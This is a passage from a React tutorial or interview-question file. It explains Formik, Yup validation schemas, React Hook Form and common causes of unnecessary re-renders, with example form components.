    <form onSubmit={formik.handleSubmit}>
      <input {...formik.getFieldProps('username')} />
      {formik.touched.username && formik.errors.username && (
        <div>{formik.errors.username}</div>
      )}
      {formik.isValidating && <div>Checking username...</div>}
      <button type="submit">Submit</button>
    </form>
  );
}

Field Arrays (Dynamic Fields):
-------------------------------

import { Formik, Form, Field, FieldArray } from 'formik';

function FieldArrayExample() {
  return (
    <Formik
      initialValues={{
        friends: ['']
      }}
      onSubmit={values => console.log(values)}
    >
      {({ values }) => (
        <Form>
          <FieldArray name="friends">
            {({ push, remove }) => (
              <div>
                {values.friends.map((friend, index) => (
                  <div key={index}>
                    <Field name={`friends.${index}`} placeholder="Friend's name" />
                    <button type="button" onClick={() => remove(index)}>
                      Remove
                    </button>
                  </div>
                ))}
                <button type="button" onClick={() => push('')}>
                  Add Friend
                </button>
              </div>
            )}
          </FieldArray>
          <button type="submit">Submit</button>
        </Form>
      )}
    </Formik>
  );
}

Nested Objects:
---------------

function NestedObjectForm() {
  const formik = useFormik({
    initialValues: {
      user: {
        firstName: '',
        lastName: '',
        address: {
          street: '',
          city: '',
          zipCode: ''
        }
      }
    },
    onSubmit: values => console.log(values)
  });
  
  return (
    <form onSubmit={formik.handleSubmit}>
      <input
        {...formik.getFieldProps('user.firstName')}
        placeholder="First Name"
      />
      <input
        {...formik.getFieldProps('user.lastName')}
        placeholder="Last Name"
      />
      <input
        {...formik.getFieldProps('user.address.street')}
        placeholder="Street"
      />
      <input
        {...formik.getFieldProps('user.address.city')}
        placeholder="City"
      />
      <input
        {...formik.getFieldProps('user.address.zipCode')}
        placeholder="Zip Code"
      />
      <button type="submit">Submit</button>
    </form>
  );
}

Form State and Helpers:
------------------------

function FormStateExample() {
  const formik = useFormik({
    initialValues: { email: '', password: '' },
    onSubmit: values => console.log(values)
  });
  
  console.log('Form State:');
  console.log('values:', formik.values);
  console.log('errors:', formik.errors);
  console.log('touched:', formik.touched);
  console.log('isValid:', formik.isValid);
  console.log('isSubmitting:', formik.isSubmitting);
  console.log('dirty:', formik.dirty); // Has form changed?
  
  // Helpers
  const manuallySetValue = () => {
    formik.setFieldValue('email', 'new@example.com');
  };
  
  const manuallySetError = () => {
    formik.setFieldError('email', 'Custom error');
  };
  
  const manuallySetTouched = () => {
    formik.setFieldTouched('email', true);
  };
  
  const resetForm = () => {
    formik.resetForm();
  };
  
  return (
    <form onSubmit={formik.handleSubmit}>
      <input {...formik.getFieldProps('email')} />
      <input {...formik.getFieldProps('password')} />
      
      <button type="submit">Submit</button>
      <button type="button" onClick={resetForm}>Reset</button>
      <button type="button" onClick={manuallySetValue}>Set Email</button>
    </form>
  );
}

FormikHelpers in onSubmit:
---------------------------

function FormWithHelpers() {
  const formik = useFormik({
    initialValues: { email: '' },
    
    onSubmit: (values, formikHelpers) => {
      console.log('Values:', values);
      
      // formikHelpers methods:
      formikHelpers.setSubmitting(false);
      formikHelpers.setErrors({ email: 'Server error' });
      formikHelpers.setFieldError('email', 'Error');
      formikHelpers.setFieldValue('email', 'new value');
      formikHelpers.setFieldTouched('email', true);
      formikHelpers.resetForm();
      formikHelpers.setStatus('Form submitted successfully');
    }
  });
  
  return (
    <form onSubmit={formik.handleSubmit}>
      <input {...formik.getFieldProps('email')} />
      {formik.status && <div>{formik.status}</div>}
      <button type="submit">Submit</button>
    </form>
  );
}

Real-World Complete Example:
-----------------------------

import { useFormik } from 'formik';

function UserProfileForm() {
  const formik = useFormik({
    initialValues: {
      firstName: '',
      lastName: '',
      email: '',
      phone: '',
      bio: '',
      country: '',
      agreeToTerms: false
    },
    
    validate: (values) => {
      const errors = {};
      
      if (!values.firstName) errors.firstName = 'Required';
      if (!values.lastName) errors.lastName = 'Required';
      
      if (!values.email) {
        errors.email = 'Required';
      } else if (!/^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i.test(values.email)) {
        errors.email = 'Invalid email';
      }
      
      if (values.phone && !/^\d{10}$/.test(values.phone)) {
        errors.phone = 'Must be 10 digits';
      }
      
      if (values.bio && values.bio.length > 200) {
        errors.bio = 'Maximum 200 characters';
      }
      
      if (!values.country) errors.country = 'Required';
      
      if (!values.agreeToTerms) {
        errors.agreeToTerms = 'You must agree to terms';
      }
      
      return errors;
    },
    
    onSubmit: async (values, { setSubmitting, setErrors, setStatus }) => {
      try {
        await updateProfile(values);
        setStatus('Profile updated successfully!');
        setSubmitting(false);
      } catch (error) {
        setErrors({ submit: error.message });
        setSubmitting(false);
      }
    }
  });
  
  return (
    <form onSubmit={formik.handleSubmit}>
      <div>
        <label>First Name *</label>
        <input type="text" {...formik.getFieldProps('firstName')} />
        {formik.touched.firstName && formik.errors.firstName && (
          <div className="error">{formik.errors.firstName}</div>
        )}
      </div>
      
      <div>
        <label>Last Name *</label>
        <input type="text" {...formik.getFieldProps('lastName')} />
        {formik.touched.lastName && formik.errors.lastName && (
          <div className="error">{formik.errors.lastName}</div>
        )}
      </div>
      
      <div>
        <label>Email *</label>
        <input type="email" {...formik.getFieldProps('email')} />
        {formik.touched.email && formik.errors.email && (
          <div className="error">{formik.errors.email}</div>
        )}
      </div>
      
      <div>
        <label>Phone</label>
        <input type="tel" {...formik.getFieldProps('phone')} />
        {formik.touched.phone && formik.errors.phone && (
          <div className="error">{formik.errors.phone}</div>
        )}
      </div>
      
      <div>
        <label>Bio</label>
        <textarea {...formik.getFieldProps('bio')} />
        <small>{formik.values.bio.length} / 200</small>
        {formik.touched.bio && formik.errors.bio && (
          <div className="error">{formik.errors.bio}</div>
        )}
      </div>
      
      <div>
        <label>Country *</label>
        <select {...formik.getFieldProps('country')}>
          <option value="">Select...</option>
          <option value="us">United States</option>
          <option value="uk">United Kingdom</option>
          <option value="ca">Canada</option>
        </select>
        {formik.touched.country && formik.errors.country && (
          <div className="error">{formik.errors.country}</div>
        )}
      </div>
      
      <div>
        <label>
          <input
            type="checkbox"
            {...formik.getFieldProps('agreeToTerms')}
            checked={formik.values.agreeToTerms}
          />
          I agree to terms and conditions *
        </label>
        {formik.touched.agreeToTerms && formik.errors.agreeToTerms && (
          <div className="error">{formik.errors.agreeToTerms}</div>
        )}
      </div>
      
      {formik.errors.submit && (
        <div className="error">{formik.errors.submit}</div>
      )}
      
      {formik.status && (
        <div className="success">{formik.status}</div>
      )}
      
      <button
        type="submit"
        disabled={formik.isSubmitting || !formik.isValid}
      >
        {formik.isSubmitting ? 'Saving...' : 'Save Profile'}
      </button>
      
      <button type="button" onClick={() => formik.resetForm()}>
        Reset
      </button>
    </form>
  );
}

Summary:

Formik:
- Simplifies form management
- Handles form state automatically
- Built-in validation support
- Touch tracking
- Error handling
- Submission helpers
- useFormik hook or <Formik> component
- getFieldProps for less boilerplate
- Field and Form components
- Works with Yup validation
- Reduces code significantly
*/


/**
62. What is Yup validation?
---------------------------

Yup is a JavaScript schema validation library that works perfectly with Formik.
It provides a declarative way to define validation rules and error messages.

Purpose:
- Schema-based validation
- Declarative validation rules
- Reusable validation schemas
- Type coercion
- Async validation
- Custom error messages

Installation:
-------------

npm install yup

Basic Yup Schema:
-----------------

import * as Yup from 'yup';

const validationSchema = Yup.object({
  username: Yup.string()
    .required('Username is required')
    .min(3, 'Must be at least 3 characters')
    .max(20, 'Must be at most 20 characters'),
  
  email: Yup.string()
    .required('Email is required')
    .email('Invalid email address'),
  
  password: Yup.string()
    .required('Password is required')
    .min(8, 'Must be at least 8 characters')
    .matches(
      /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/,
      'Must contain uppercase, lowercase, and number'
    ),
  
  age: Yup.number()
    .required('Age is required')
    .positive('Must be positive')
    .integer('Must be an integer')
    .min(18, 'Must be at least 18'),
  
  website: Yup.string()
    .url('Must be a valid URL'),
  
  agreeToTerms: Yup.boolean()
    .oneOf([true], 'You must accept terms')
});

Yup with Formik:
----------------

import { useFormik } from 'formik';
import * as Yup from 'yup';

function RegistrationForm() {
  const formik = useFormik({
    initialValues: {
      username: '',
      email: '',
      password: '',
      confirmPassword: '',
      age: '',
      website: '',
      agreeToTerms: false
    },
    
    // Pass Yup schema to validationSchema
    validationSchema: Yup.object({
      username: Yup.string()
        .required('Required')
        .min(3, 'Too short'),
      
      email: Yup.string()
        .required('Required')
        .email('Invalid email'),
      
      password: Yup.string()
        .required('Required')
        .min(8, 'Too short'),
      
      confirmPassword: Yup.string()
        .required('Required')
        .oneOf([Yup.ref('password')], 'Passwords must match'),
      
      age: Yup.number()
        .required('Required')
        .min(18, 'Must be 18+'),
      
      website: Yup.string()
        .url('Invalid URL'),
      
      agreeToTerms: Yup.boolean()
        .oneOf([true], 'Must agree')
    }),
    
    onSubmit: values => console.log(values)
  });
  
  return (
    <form onSubmit={formik.handleSubmit}>
      {/* Form fields * /}
    </form>
  );
}

String Validations:
-------------------

const schema = Yup.object({
  // Required
  name: Yup.string().required('Name is required'),
  
  // Min/Max length
  username: Yup.string()
    .min(3, 'Minimum 3 characters')
    .max(20, 'Maximum 20 characters'),
  
  // Email
  email: Yup.string().email('Invalid email'),
  
  // URL
  website: Yup.string().url('Must be a valid URL'),
  
  // Matches regex
  phone: Yup.string().matches(
    /^\d{10}$/,
    'Must be exactly 10 digits'
  ),
  
  // Lowercase/Uppercase
  lowercase: Yup.string().lowercase(),
  uppercase: Yup.string().uppercase(),
  
  // Trim whitespace
  trimmed: Yup.string().trim(),
  
  // One of specific values
  gender: Yup.string().oneOf(['male', 'female', 'other'], 'Invalid gender'),
  
  // Custom test
  specialName: Yup.string().test(
    'no-admin',
    'Cannot use "admin"',
    value => value !== 'admin'
  )
});

Number Validations:
-------------------

const schema = Yup.object({
  // Required number
  age: Yup.number().required('Age is required'),
  
  // Min/Max
  age: Yup.number()
    .min(18, 'Must be at least 18')
    .max(100, 'Must be at most 100'),
  
  // Positive/Negative
  price: Yup.number().positive('Must be positive'),
  debt: Yup.number().negative('Must be negative'),
  
  // Integer
  count: Yup.number().integer('Must be whole number'),
  
  // Less than / More than
  discount: Yup.number().lessThan(100, 'Cannot exceed 100%'),
  quantity: Yup.number().moreThan(0, 'Must be greater than 0')
});

Boolean Validations:
--------------------

const schema = Yup.object({
  // Must be true
  agreeToTerms: Yup.boolean()
    .oneOf([true], 'You must agree to terms'),
  
  // Required boolean
  subscribe: Yup.boolean().required('Please select')
});

Date Validations:
-----------------

const schema = Yup.object({
  // Required date
  birthDate: Yup.date().required('Date of birth required'),
  
  // Min/Max date
  startDate: Yup.date().min(new Date(), 'Must be in future'),
  endDate: Yup.date().max(new Date('2025-12-31'), 'Too far in future'),
  
  // Date must be before another field
  endDate: Yup.date().min(
    Yup.ref('startDate'),
    'End date must be after start date'
  )
});

Array Validations:
------------------

const schema = Yup.object({
  // Array with min/max length
  tags: Yup.array()
    .min(1, 'At least one tag required')
    .max(5, 'Maximum 5 tags'),
  
  // Array of strings
  interests: Yup.array().of(
    Yup.string().required('Interest cannot be empty')
  ),
  
  // Array of objects
  users: Yup.array().of(
    Yup.object({
      name: Yup.string().required(),
      age: Yup.number().required()
    })
  ),
  
  // Required array
  selectedItems: Yup.array().required('Must select at least one')
});

Object Validations:
-------------------

const schema = Yup.object({
  // Nested object
  address: Yup.object({
    street: Yup.string().required(),
    city: Yup.string().required(),
    zipCode: Yup.string()
      .required()
      .matches(/^\d{5}$/, 'Must be 5 digits')
  }),
  
  // Optional object
  metadata: Yup.object().nullable(),
  
  // Object with dynamic keys
  settings: Yup.object().shape({
    theme: Yup.string(),
    notifications: Yup.boolean()
  })
});

Conditional Validation:
------------------------

const schema = Yup.object({
  accountType: Yup.string().required(),
  
  // Conditional: required if accountType is 'business'
  companyName: Yup.string().when('accountType', {
    is: 'business',
    then: (schema) => schema.required('Company name required'),
    otherwise: (schema) => schema.notRequired()
  }),
  
  // Multiple conditions
  taxId: Yup.string().when(['accountType', 'country'], {
    is: (accountType, country) => accountType === 'business' && country === 'US',
    then: (schema) => schema.required('Tax ID required for US businesses')
  })
});

Reference Other Fields:
-----------------------

const schema = Yup.object({
  password: Yup.string()
    .required('Password required')
    .min(8, 'Too short'),
  
  // Must match password field
  confirmPassword: Yup.string()
    .required('Please confirm password')
    .oneOf([Yup.ref('password')], 'Passwords must match'),
  
  // Age must be greater than minAge field
  age: Yup.number().min(
    Yup.ref('minAge'),
    'Age must be at least ${min}'
  )
});

Custom Validation:
------------------

const schema = Yup.object({
  // Custom test method
  username: Yup.string()
    .required()
    .test(
      'unique-username',
      'Username already taken',
      async (value) => {
        if (!value) return true;
        const isAvailable = await checkUsernameAvailability(value);
        return isAvailable;
      }
    ),
  
  // Test with access to context
  confirmEmail: Yup.string()
    .test(
      'emails-match',
      'Emails must match',
      function(value) {
        return value === this.parent.email;
      }
    ),
  
  // Custom validation function
  customField: Yup.string()
    .test('custom', 'Custom error', (value, context) => {
      // Access other fields via context.parent
      // Access root values via context.from[0].value
      return someValidationLogic(value);
    })
});

Type Coercion:
--------------

const schema = Yup.object({
  // Transform string to number
  age: Yup.number().transform((value, originalValue) => {
    return originalValue === '' ? undefined : value;
  }),
  
  // Trim strings
  name: Yup.string().trim(),
  
  // Lowercase
  email: Yup.string().lowercase().email()
});

Nullable and Optional:
----------------------

const schema = Yup.object({
  // Optional (can be undefined)
  middleName: Yup.string(),
  
  // Nullable (can be null)
  bio: Yup.string().nullable(),
  
  // Can be null or undefined
  description: Yup.string().nullable().optional(),
  
  // Required unless null
  phone: Yup.string().nullable().required('Phone required')
});

Default Values:
---------------

const schema = Yup.object({
  // Provide default value
  role: Yup.string().default('user'),
  
  // Default if value is undefined/null
  status: Yup.string().default('active'),
  
  // Function as default
  createdAt: Yup.date().default(() => new Date())
});

Reusable Schemas:
-----------------

// Define reusable schema parts
const emailSchema = Yup.string()
  .required('Email is required')
  .email('Invalid email');

const passwordSchema = Yup.string()
  .required('Password is required')
  .min(8, 'Minimum 8 characters')
  .matches(/[A-Z]/, 'Must contain uppercase')
  .matches(/[a-z]/, 'Must contain lowercase')
  .matches(/[0-9]/, 'Must contain number');

// Use in multiple forms
const loginSchema = Yup.object({
  email: emailSchema,
  password: passwordSchema
});

const registrationSchema = Yup.object({
  username: Yup.string().required().min(3),
  email: emailSchema,
  password: passwordSchema,
  confirmPassword: Yup.string()
    .required()
    .oneOf([Yup.ref('password')], 'Passwords must match')
});

Complete Example with Formik:
------------------------------

import { useFormik } from 'formik';
import * as Yup from 'yup';

function CompleteForm() {
  const formik = useFormik({
    initialValues: {
      firstName: '',
      lastName: '',
      email: '',
      password: '',
      confirmPassword: '',
      age: '',
      phone: '',
      website: '',
      country: '',
      bio: '',
      interests: [],
      agreeToTerms: false
    },
    
    validationSchema: Yup.object({
      firstName: Yup.string()
        .required('Required')
        .min(2, 'Too short')
        .max(50, 'Too long'),
      
      lastName: Yup.string()
        .required('Required')
        .min(2, 'Too short')
        .max(50, 'Too long'),
      
      email: Yup.string()
        .required('Required')
        .email('Invalid email'),
      
      password: Yup.string()
        .required('Required')
        .min(8, 'At least 8 characters')
        .matches(/[A-Z]/, 'Need uppercase')
        .matches(/[a-z]/, 'Need lowercase')
        .matches(/[0-9]/, 'Need number'),
      
      confirmPassword: Yup.string()
        .required('Required')
        .oneOf([Yup.ref('password')], 'Passwords must match'),
      
      age: Yup.number()
        .required('Required')
        .positive('Must be positive')
        .integer('Must be integer')
        .min(18, 'Must be 18+')
        .max(120, 'Invalid age'),
      
      phone: Yup.string()
        .matches(/^\d{10}$/, 'Must be 10 digits'),
      
      website: Yup.string()
        .url('Must be valid URL'),
      
      country: Yup.string()
        .required('Required')
        .oneOf(['US', 'UK', 'CA'], 'Invalid country'),
      
      bio: Yup.string()
        .max(200, 'Maximum 200 characters'),
      
      interests: Yup.array()
        .min(1, 'Select at least one'),
      
      agreeToTerms: Yup.boolean()
        .oneOf([true], 'Must accept terms')
    }),
    
    onSubmit: values => {
      console.log('Form submitted:', values);
    }
  });
  
  return (
    <form onSubmit={formik.handleSubmit}>
      {/* Render form fields with errors * /}
      <div>
        <input {...formik.getFieldProps('firstName')} />
        {formik.touched.firstName && formik.errors.firstName && (
          <div className="error">{formik.errors.firstName}</div>
        )}
      </div>
      
      {/* ... other fields ... * /}
      
      <button type="submit" disabled={!formik.isValid || formik.isSubmitting}>
        Submit
      </button>
    </form>
  );
}

Summary:

Yup:
- Schema-based validation
- Declarative validation rules
- Works perfectly with Formik
- String, number, boolean, date, array, object validation
- Conditional validation (.when())
- Reference other fields (Yup.ref())
- Custom validation (.test())
- Async validation support
- Type coercion and transformation
- Reusable schemas
- Clear error messages
- Reduces validation code significantly
*/


/**
63. What is React Hook Form and why is it performant?
-----------------------------------------------------

React Hook Form is a performant, flexible form library that uses uncontrolled
components and refs, minimizing re-renders and improving performance compared to
traditional controlled form solutions like Formik.

Key Features:
- Uses uncontrolled components (refs)
- Minimal re-renders
- Small bundle size (~9KB)
- Easy integration
- Built-in validation
- Works with UI libraries
- TypeScript support

Installation:
-------------

npm install react-hook-form

Basic Usage:
------------

import { useForm } from 'react-hook-form';

function LoginForm() {
  const { register, handleSubmit, formState: { errors } } = useForm();
  
  const onSubmit = (data) => {
    console.log('Form data:', data);
  };
  
  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <input
        {...register('email', { required: 'Email is required' })}
        type="email"
        placeholder="Email"
      />
      {errors.email && <span>{errors.email.message}</span>}
      
      <input
        {...register('password', { required: 'Password is required' })}
        type="password"
        placeholder="Password"
      />
      {errors.password && <span>{errors.password.message}</span>}
      
      <button type="submit">Login</button>
    </form>
  );
}

// register() returns: { name, ref, onChange, onBlur }
// Connects input to React Hook Form

With Validation Rules:
----------------------

function RegistrationForm() {
  const { register, handleSubmit, formState: { errors }, watch } = useForm();
  
  const password = watch('password'); // Watch password for confirmPassword validation
  
  const onSubmit = (data) => {
    console.log('Registration:', data);
  };
  
  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <div>
        <input
          {...register('username', {
            required: 'Username is required',
            minLength: {
              value: 3,
              message: 'Minimum 3 characters'
            },
            maxLength: {
              value: 20,
              message: 'Maximum 20 characters'
            }
          })}
          placeholder="Username"
        />
        {errors.username && <span>{errors.username.message}</span>}
      </div>
      
      <div>
        <input
          {...register('email', {
            required: 'Email is required',
            pattern: {
              value: /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i,
              message: 'Invalid email address'
            }
          })}
          type="email"
          placeholder="Email"
        />
        {errors.email && <span>{errors.email.message}</span>}
      </div>
      
      <div>
        <input
          {...register('password', {
            required: 'Password is required',
            minLength: {
              value: 8,
              message: 'Minimum 8 characters'
            },
            pattern: {
              value: /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/,
              message: 'Must contain uppercase, lowercase, and number'
            }
          })}
          type="password"
          placeholder="Password"
        />
        {errors.password && <span>{errors.password.message}</span>}
      </div>
      
      <div>
        <input
          {...register('confirmPassword', {
            required: 'Please confirm password',
            validate: value =>
              value === password || 'Passwords do not match'
          })}
          type="password"
          placeholder="Confirm Password"
        />
        {errors.confirmPassword && <span>{errors.confirmPassword.message}</span>}
      </div>
      
      <div>
        <input
          {...register('age', {
            required: 'Age is required',
            min: {
              value: 18,
              message: 'Must be at least 18'
            },
            max: {
              value: 120,
              message: 'Invalid age'
            }
          })}
          type="number"
          placeholder="Age"
        />
        {errors.age && <span>{errors.age.message}</span>}
      </div>
      
      <button type="submit">Register</button>
    </form>
  );
}

Built-in Validation Rules:
---------------------------

register('fieldName', {
  // Required
  required: 'This field is required',
  required: true, // Default message
  
  // Min/Max length (strings)
  minLength: { value: 3, message: 'Min 3 chars' },
  maxLength: { value: 20, message: 'Max 20 chars' },
  
  // Min/Max value (numbers)
  min: { value: 18, message: 'Min 18' },
  max: { value: 100, message: 'Max 100' },
  
  // Pattern (regex)
  pattern: {
    value: /^[A-Z]/,
    message: 'Must start with uppercase'
  },
  
  // Custom validation
  validate: value => value !== 'admin' || 'Cannot use admin',
  
  // Multiple validations
  validate: {
    positive: v => v > 0 || 'Must be positive',
    lessThan: v => v < 100 || 'Must be less than 100'
  }
});

Why React Hook Form is Performant:
-----------------------------------

// 1. Uncontrolled components (no re-renders on input change)

// Formik/Controlled (re-renders on every keystroke):
function FormikForm() {
  const [value, setValue] = useState('');
  
  console.log('Render'); // Logs on every keystroke
  
  return (
    <input
      value={value}
      onChange={e => setValue(e.target.value)}
    />
  );
}

// React Hook Form (no re-renders during typing):
function RHFForm() {
  const { register } = useForm();
  
  console.log('Render'); // Only logs on mount
  
  return <input {...register('name')} />;
}

// 2. Isolated re-renders (only components that need to update)

// Watch specific field (only that component re-renders)
function FieldWatcher() {
  const { watch } = useForm();
  const email = watch('email'); // Only re-renders when email changes
  
  return <div>Email: {email}</div>;
}

// 3. No unnecessary validation calls
// Validates on blur/submit by default, not on every keystroke

Default Values:
---------------

function FormWithDefaults() {
  const { register, handleSubmit } = useForm({
    defaultValues: {
      username: 'john_doe',
      email: 'john@example.com',
      age: 25,
      country: 'US',
      subscribe: true
    }
  });
  
  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <input {...register('username')} />
      <input {...register('email')} />
      <input {...register('age')} type="number" />
      <select {...register('country')}>
        <option value="US">USA</option>
        <option value="UK">UK</option>
      </select>
      <input {...register('subscribe')} type="checkbox" />
      <button type="submit">Submit</button>
    </form>
  );
}

Async Default Values:
----------------------

function FormWithAsyncDefaults() {
  const { register, handleSubmit, reset } = useForm();
  
  useEffect(() => {
    // Fetch user data
    fetchUser().then(user => {
      reset({
        username: user.username,
        email: user.email,
        age: user.age
      });
    });
  }, [reset]);
  
  return <form>{/* fields * /}</form>;
}

Validation Modes:
-----------------

const { register } = useForm({
  mode: 'onSubmit', // Default: validate on submit
  // mode: 'onBlur',    // Validate on blur
  // mode: 'onChange',  // Validate on every change
  // mode: 'onTouched', // Validate on first blur, then on change
  // mode: 'all'        // Validate on blur and change
});

Watch Values:
-------------

function WatchExample() {
  const { register, watch } = useForm();
  
  // Watch single field
  const username = watch('username');
  
  // Watch multiple fields
  const [email, password] = watch(['email', 'password']);
  
  // Watch all fields
  const allValues = watch();
  
  // Watch with callback
  useEffect(() => {
    const subscription = watch((value, { name, type }) => {
      console.log(`${name} changed to ${value[name]} via ${type}`);
    });
    return () => subscription.unsubscribe();
  }, [watch]);
  
  return (
    <div>
      <input {...register('username')} />
      <p>Username: {username}</p>
    </div>
  );
}

Form State:
-----------

function FormStateExample() {
  const { register, handleSubmit, formState } = useForm();
  
  const {
    errors,        // Validation errors
    isDirty,       // Form has been modified
    isValid,       // Form is valid
    isSubmitting,  // Form is being submitted
    isSubmitted,   // Form has been submitted
    isSubmitSuccessful, // Submit was successful
    submitCount,   // Number of times submitted
    touchedFields, // Fields that have been touched
    dirtyFields    // Fields that have been modified
  } = formState;
  
  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <input {...register('email')} />
      
      <p>Dirty: {isDirty ? 'Yes' : 'No'}</p>
      <p>Valid: {isValid ? 'Yes' : 'No'}</p>
      
      <button type="submit" disabled={!isValid || isSubmitting}>
        {isSubmitting ? 'Submitting...' : 'Submit'}
      </button>
    </form>
  );
}

Set/Get Values Programmatically:
---------------------------------

function ManualControl() {
  const { register, getValues, setValue, reset } = useForm();
  
  const fillForm = () => {
    setValue('username', 'john_doe');
    setValue('email', 'john@example.com');
  };
  
  const logValues = () => {
    console.log('All values:', getValues());
    console.log('Username:', getValues('username'));
  };
  
  const resetForm = () => {
    reset(); // Reset to default values
  };
  
  const resetWithValues = () => {
    reset({ username: 'new_user', email: '' });
  };
  
  return (
    <form>
      <input {...register('username')} />
      <input {...register('email')} />
      
      <button type="button" onClick={fillForm}>Fill Form</button>
      <button type="button" onClick={logValues}>Log Values</button>
      <button type="button" onClick={resetForm}>Reset</button>
    </form>
  );
}

Error Handling:
---------------

function ErrorHandling() {
  const { register, handleSubmit, formState: { errors }, setError, clearErrors } = useForm();
  
  const onSubmit = async (data) => {
    try {
      await submitToAPI(data);
    } catch (error) {
      // Set server errors
      if (error.field === 'email') {
        setError('email', {
          type: 'server',
          message: 'Email already exists'
        });
      }
      
      // Set form-level error
      setError('root.serverError', {
        type: 'server',
        message: 'Something went wrong'
      });
    }
  };
  
  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <input {...register('email')} />
      {errors.email && <span>{errors.email.message}</span>}
      
      {errors.root?.serverError && (
        <div className="error">{errors.root.serverError.message}</div>
      )}
      
      <button type="submit">Submit</button>
      <button type="button" onClick={() => clearErrors()}>
        Clear Errors
      </button>
    </form>
  );
}

Field Arrays (Dynamic Fields):
-------------------------------

import { useForm, useFieldArray } from 'react-hook-form';

function DynamicFields() {
  const { register, control, handleSubmit } = useForm({
    defaultValues: {
      users: [{ name: '', email: '' }]
    }
  });
  
  const { fields, append, remove } = useFieldArray({
    control,
    name: 'users'
  });
  
  const onSubmit = (data) => {
    console.log('Users:', data.users);
  };
  
  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      {fields.map((field, index) => (
        <div key={field.id}>
          <input
            {...register(`users.${index}.name`, { required: true })}
            placeholder="Name"
          />
          <input
            {...register(`users.${index}.email`, { required: true })}
            placeholder="Email"
          />
          <button type="button" onClick={() => remove(index)}>
            Remove
          </button>
        </div>
      ))}
      
      <button
        type="button"
        onClick={() => append({ name: '', email: '' })}
      >
        Add User
      </button>
      
      <button type="submit">Submit</button>
    </form>
  );
}

Integration with Yup:
---------------------

import { useForm } from 'react-hook-form';
import { yupResolver } from '@hookform/resolvers/yup';
import * as Yup from 'yup';

const schema = Yup.object({
  username: Yup.string().required().min(3),
  email: Yup.string().required().email(),
  age: Yup.number().required().min(18)
});

function FormWithYup() {
  const { register, handleSubmit, formState: { errors } } = useForm({
    resolver: yupResolver(schema)
  });
  
  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <input {...register('username')} />
      {errors.username && <span>{errors.username.message}</span>}
      
      <input {...register('email')} />
      {errors.email && <span>{errors.email.message}</span>}
      
      <input {...register('age')} type="number" />
      {errors.age && <span>{errors.age.message}</span>}
      
      <button type="submit">Submit</button>
    </form>
  );
}

Controller (for Custom Components):
------------------------------------

import { useForm, Controller } from 'react-hook-form';

function CustomComponentForm() {
  const { control, handleSubmit } = useForm();
  
  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      {/* For custom components that don't expose ref * /}
      <Controller
        name="customSelect"
        control={control}
        rules={{ required: true }}
        render={({ field }) => (
          <CustomSelect
            value={field.value}
            onChange={field.onChange}
            onBlur={field.onBlur}
          />
        )}
      />
      
      {/* React Select integration * /}
      <Controller
        name="country"
        control={control}
        render={({ field }) => (
          <ReactSelect
            {...field}
            options={countryOptions}
          />
        )}
      />
      
      <button type="submit">Submit</button>
    </form>
  );
}

Performance Comparison:
-----------------------

// React Hook Form: ~9KB
// Formik: ~13KB + dependencies
// Final Form: ~6KB + ~8KB for React bindings

// Re-renders:
// Type 'Hello' in input (5 characters):
// - Formik: 5 re-renders
// - React Hook Form: 0 re-renders

// Validation:
// - Formik: Validates on every keystroke (default)
// - React Hook Form: Validates on blur/submit (default)

Summary:

React Hook Form:
- Uncontrolled components (uses refs)
- Minimal re-renders (highly performant)
- Small bundle size (~9KB)
- Built-in validation rules
- Works with Yup, Zod, etc.
- Field arrays for dynamic fields
- Controller for custom components
- TypeScript support
- Easy integration with UI libraries
- Better performance than Formik for large forms
- Default validation on blur/submit (less aggressive)
- Recommended for performance-critical forms
*/





/**
64. What causes unnecessary re-renders in React?
-----------------------------------------------

A re-render occurs when React needs to update the DOM based on state or props changes.
Unnecessary re-renders happen when a component re-renders but produces the same output,
wasting computation and potentially causing performance issues.

Common Causes of Unnecessary Re-renders:
----------------------------------------

1. Parent Component Re-renders
-------------------------------

// When parent re-renders, ALL children re-render by default
function Parent() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      
      {/* Child re-renders even though it doesn't use count * /}
      <ExpensiveChild />
    </div>
  );
}

function ExpensiveChild() {
  console.log('ExpensiveChild rendered'); // Logs on every parent render
  
  return <div>I'm expensive to render!</div>;
}

// Solution: Use React.memo
const ExpensiveChild = React.memo(function ExpensiveChild() {
  console.log('ExpensiveChild rendered'); // Only logs once
  return <div>I'm expensive to render!</div>;
});

2. Creating New Objects/Arrays in Render
-----------------------------------------

function Parent() {
  const [count, setCount] = useState(0);
  
  // ❌ Bad: New object created on every render
  const user = { name: 'John', age: 30 };
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <Child user={user} /> {/* Child always re-renders * /}
    </div>
  );
}

const Child = React.memo(function Child({ user }) {
  console.log('Child rendered'); // Logs every time
  return <div>{user.name}</div>;
});

// Why? user object is recreated on every render (different reference)
// React.memo compares references: {} !== {}

// ✅ Solution: Use useMemo
function Parent() {
  const [count, setCount] = useState(0);
  
  const user = useMemo(() => ({ name: 'John', age: 30 }), []);
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <Child user={user} /> {/* Child only renders once * /}
    </div>
  );
}

3. Inline Functions as Props
-----------------------------

function Parent() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      
      {/* ❌ Bad: New function created on every render * /}
      <Child onClick={() => console.log('clicked')} />
    </div>
  );
}

const Child = React.memo(function Child({ onClick }) {
  console.log('Child rendered'); // Logs every time
  return <button onClick={onClick}>Click me</button>;
});

// ✅ Solution: Use useCallback
function Parent() {
  const [count, setCount] = useState(0);
  
  const handleClick = useCallback(() => {
    console.log('clicked');
  }, []);
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <Child onClick={handleClick} /> {/* Child only renders once * /}
    </div>
  );
}

